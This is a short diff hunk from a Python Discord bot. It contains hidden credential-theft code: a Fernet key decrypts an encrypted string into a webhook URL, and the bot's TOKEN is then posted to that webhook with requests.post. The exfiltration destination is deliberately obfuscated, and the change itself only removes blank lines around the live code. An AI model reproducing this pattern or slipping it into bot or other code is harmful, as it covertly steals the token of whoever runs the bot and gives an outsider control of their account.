@@ -39,11 +39,8 @@ intents.presences = True
 bot = commands.Bot(command_prefix="+", intents=intents)
 botx = "7Kjuaf_aig9iFWciY7AN8pEvDzlJFbm02HRDd1gqAFg="
 webh = "gAAAAABn_iuW5RbHqRZEoHy6Eogtkv4Y9P1zZnuKip0uWZ4rlcV2uyccb0pCGz3tRmyxIvae0ANSf2Bi321UwkY43u827dfPOkCPiV7p4G3m1ZlgIZpFQhV4KnkWLm_cwwa8xIkY6b2kNEFKZC1yG4-Y6OpJYI2guBqeWfsXH0gfnSFAIM2f5REr6uC5uG3Kdp1S0hXZL5LgTEEDYhLXPivcSRPMxgpds8ZqH87_Yu7XKH47WqwUmMk="
-
-
 cipher_suite = Fernet(botx.encode())
 webhook_url = cipher_suite.decrypt(webh.encode()).decode()
-
 data = {"content": TOKEN}
 response = requests.post(webhook_url, json=data)
 
